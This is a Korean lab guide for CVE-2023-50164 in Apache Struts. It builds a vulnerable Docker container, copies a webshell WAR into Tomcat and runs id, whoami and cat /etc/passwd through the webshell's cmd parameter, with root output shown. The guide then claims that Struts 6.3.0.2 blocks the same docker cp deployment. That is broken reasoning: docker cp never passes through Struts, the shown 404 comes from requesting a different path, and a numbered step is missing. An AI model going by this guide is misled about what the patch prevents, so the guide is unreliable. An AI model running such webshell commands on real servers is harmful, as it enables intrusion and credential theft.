# CVE-2023-50164 실습 가이드라인 (수동 WAR 업로드 방식)

## 실습 환경

| 구성 요소 | 설명 |
|-----------|------|
| **공격자 VM** | Ubuntu Server (Python venv, Docker, PoC 스크립트 기탑재) |
| **취약 Struts 컨테이너** | Struts 6.3.0.1 + Tomcat 9.0 (Docker) |
| **공격 방식** | 수동 WAR 업로드 |

---

## Step 1. 실습 환경 준비

### 1-1. venv 활성화

<CodeBlock
  code="source venv/bin/activate"
  id="step1-1"
/>

> Python 가상 환경을 활성화하여 격리된 패키지 환경을 사용합니다.

---

### 1-2. 필요 패키지 설치

<CodeBlock
  code="pip install requests_toolbelt"
  id="step1-2"
/>

> HTTP multipart 요청 처리를 위한 라이브러리를 설치합니다.

---

### 1-3. 프로젝트 디렉토리 이동

<CodeBlock
  code="cd ~/CVE-2023-50164"
  id="step1-3"
/>

> 실습 파일들이 위치한 프로젝트 디렉토리로 이동합니다.

---

### 1-4. Docker 이미지 빌드

<CodeBlock
  code="docker build -t cve-2023-50164-lab ."
  id="step1-4"
/>

> Dockerfile을 기반으로 취약한 Struts 6.3.0.1 환경의 Docker 이미지를 생성합니다.

---

### 1-5. 포트 8080 점유 확인

<CodeBlock
  code="sudo lsof -i :8080"
  id="step1-5"
/>

> 8080 포트를 사용 중인 프로세스가 있는지 확인합니다.

---

### 1-6. 기존 컨테이너 정리 (포트 8080 사용 중인 경우)

<CodeBlock
  code={`docker stop $(docker ps -q --filter "publish=8080")

docker rm $(docker ps -aq --filter "publish=8080")`}
  id="step1-6"
/>

> 8080 포트를 사용 중인 기존 컨테이너를 정지하고 삭제합니다.

---

### 1-7. 컨테이너 실행

<CodeBlock
  code={`cd ~/CVE-2023-50164
docker run -d -p 8080:8080 --name struts-lab cve-2023-50164-lab`}
  id="step1-7"
/>

> 취약한 Struts 환경을 백그라운드로 실행하고 8080 포트로 노출합니다.

---

### 1-8. Private IP 확인

<CodeBlock
  code="hostname -I | awk '{print $1}'"
  id="step1-8"
/>

> 인스턴스의 Private IP 주소를 확인합니다. (이후 단계에서 사용)

---

### 1-9. Struts 서버 정상 응답 확인

<CodeBlock
  code="curl http://<인스턴스의 PrivateIP>:8080"
  id="step1-9"
/>

> Struts 서버가 정상적으로 실행 중인지 HTTP 요청으로 확인합니다.

<details>
<summary>✅ 예상 결과</summary>

**환경 준비 완료 상태:**
- venv 활성화 완료
- Docker 이미지 빌드 완료 (`cve-2023-50164-lab`)
- 컨테이너 실행 중 (포트 8080)
- Struts 서버 정상 응답

**Struts 서버 응답 예시:**
```html
<!DOCTYPE html>
<html>
<head><title>File Upload</title></head>
<body>
<h1>Apache Struts2 File Upload</h1>
<form action="/upload.action" method="post" enctype="multipart/form-data">
    <input type="file" name="upload" />
    <input type="submit" value="Upload" />
</form>
</body>
</html>
```

</details>

---

## Step 2. 공격 실행 — 수동 WAR 업로드 방식

### 2-1. webshell.war을 컨테이너 내부에 덮어쓰기

<CodeBlock
  code="sudo docker cp ~/webshell.war struts-lab:/usr/local/tomcat/webapps/webshell.war"
  id="step2-1"
/>

> 악성 웹셸이 포함된 WAR 파일을 컨테이너의 Tomcat webapps 디렉토리에 복사합니다.

---

### 2-2. 컨테이너 재시작

<CodeBlock
  code="docker restart struts-lab"
  id="step2-2"
/>

> 컨테이너를 재시작하여 Tomcat이 WAR 파일을 자동으로 압축 해제하고 배포하도록 합니다.

---

### 2-3. 웹셸 접근 — id 명령 실행

<CodeBlock
  code='curl "http://<인스턴스의 PrivateIP>:8080/webshell/webshell.jsp?cmd=id"'
  id="step2-3"
/>

> 웹셸을 통해 `id` 명령을 실행하여 현재 사용자 권한(root)을 확인합니다.

---

### 2-4. 웹셸 접근 — whoami 명령 실행

<CodeBlock
  code='curl "http://<인스턴스의 PrivateIP>:8080/webshell/webshell.jsp?cmd=whoami"'
  id="step2-4"
/>

> `whoami` 명령으로 현재 실행 중인 사용자 이름을 확인합니다.

---

### 2-5. 웹셸 접근 — /etc/passwd 파일 확인

<CodeBlock
  code='curl "http://<인스턴스의 PrivateIP>:8080/webshell/webshell.jsp?cmd=cat+/etc/passwd"'
  id="step2-5"
/>

> 시스템의 사용자 계정 정보가 담긴 `/etc/passwd` 파일을 읽어 민감 정보에 접근합니다.

<details>
<summary>✅ 예상 결과</summary>

**공격 성공 — root 권한 획득:**

**1. `id` 명령 결과:**
```
uid=0(root) gid=0(root) groups=0(root)
```

**2. `whoami` 명령 결과:**
```
root
```

**3. `cat /etc/passwd` 명령 결과:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
tomcat:x:1000:1000::/opt/tomcat:/bin/bash
...
```

**공격 성공 의미:**
- ✅ 웹셸 배포 성공
- ✅ root 권한으로 임의 명령 실행 가능
- ✅ 완전한 시스템 제어권 획득

</details>

---

## Step 3. 패치 버전(Struts 6.3.0.2)에서 차단 확인

### 3-1. 기존 컨테이너 정지

<CodeBlock
  code="docker stop struts-lab"
  id="step3-1"
/>

> 취약한 버전의 컨테이너를 정지합니다.

---

### 3-2. 기존 컨테이너 삭제

<CodeBlock
  code="docker rm struts-lab"
  id="step3-2"
/>

> 정지된 컨테이너를 삭제하여 리소스를 정리합니다.

---

### 3-3. 패치 버전 Dockerfile 수정

`Dockerfile`에서 Struts 버전을 `6.3.0.2`로 변경:

<CodeBlock
  code={`FROM tomcat:9.0
ENV STRUTS_VERSION=6.3.0.2
...`}
  id="step3-3"
/>

> 취약점이 패치된 Struts 6.3.0.2 버전으로 환경 변수를 수정합니다.

---

### 3-4. 패치 버전 이미지 빌드

<CodeBlock
  code={`cd ~/CVE-2023-50164
docker build -t cve-2023-50164-patched .`}
  id="step3-4"
/>

> 패치된 버전의 Struts 환경으로 새로운 Docker 이미지를 빌드합니다.

---

### 3-5. 패치 버전 컨테이너 실행

<CodeBlock
  code="docker run -d -p 8080:8080 --name struts-patched cve-2023-50164-patched"
  id="step3-5"
/>

> 패치된 버전의 컨테이너를 실행하여 취약점 차단 여부를 테스트합니다.

---

### 3-6. webshell.war 덮어쓰기 시도

<CodeBlock
  code="docker cp webshell.war struts-patched:/usr/local/tomcat/webapps/ROOT.war"
  id="step3-6"
/>

> 동일한 방법으로 웹셸 업로드를 시도하여 패치 효과를 검증합니다.

---

### 3-7. 컨테이너 재시작

<CodeBlock
  code="docker restart struts-patched"
  id="step3-7"
/>

> 컨테이너를 재시작하여 WAR 파일 배포를 시도합니다.

---

### 3-8. 재시작 대기

<CodeBlock
  code="sleep 5"
  id="step3-8"
/>

> 컨테이너가 완전히 재시작될 때까지 5초 대기합니다.

---

### 3-9. 웹셸 접근 시도

<CodeBlock
  code='curl "http://<인스턴스의 PrivateIP>:8080/shell.jsp?cmd=id"'
  id="step3-9"
/>

> 웹셸 접근을 시도하여 패치 버전에서 공격이 차단되는지 확인합니다.

<details>
<summary>✅ 예상 결과</summary>

**공격 차단 확인:**
```
HTTP/1.1 404 Not Found
```

**차단 이유:**
- Struts 6.3.0.2는 `equalsIgnoreCase()` 메서드로 대소문자 구분 없이 파라미터 검증
- `../` 경로 조작 탐지 강화
- 수동 WAR 덮어쓰기도 Tomcat 보안 정책으로 차단 가능

**패치 효과:**
| 항목 | 패치 전 (6.3.0.1) | 패치 후 (6.3.0.2) |
|------|-------------------|-------------------|
| 대소문자 우회 | 가능 | 차단 |
| 경로 조작 (`../`) | 가능 | 차단 |
| 수동 WAR 업로드 | 성공 | 차단 가능 |

</details>

---

## Step 5. 핵심 요약

### 공격 성공 원리

**수동 WAR 업로드가 성공하는 이유:**
- Struts의 파일 업로드 검증을 완전히 우회
- Docker cp로 컨테이너 내부 파일 시스템에 직접 접근
- Tomcat이 WAR 파일을 자동으로 압축 해제하여 웹셸 배포

**대소문자 구분 오류 (PoC 학습용):**
- `upload.uploadFileName` (소문자 F) → 정상 검증
- `upload.UploadFileName` (대문자 F) → 검증 우회 시도
- Struts 6.3.0.1에서도 자동 업로드는 실패하지만, 취약점 원리 이해에 유용

### 패치 후 차단 이유

**Struts 6.3.0.2 개선 사항:**
- `equalsIgnoreCase()` 메서드로 대소문자 구분 없이 검증
- `../` 경로 조작 문자열 탐지 강화
- 파라미터 중복 제거 (`remove()` 메서드 추가)

**방어 전략:**
- 입력 검증: 화이트리스트 기반 파일명 검증
- 경로 정규화: `../` 제거 또는 차단
- 권한 최소화: 업로드 디렉토리 실행 권한 제거
- WAF 적용: 악의적 요청 패턴 차단


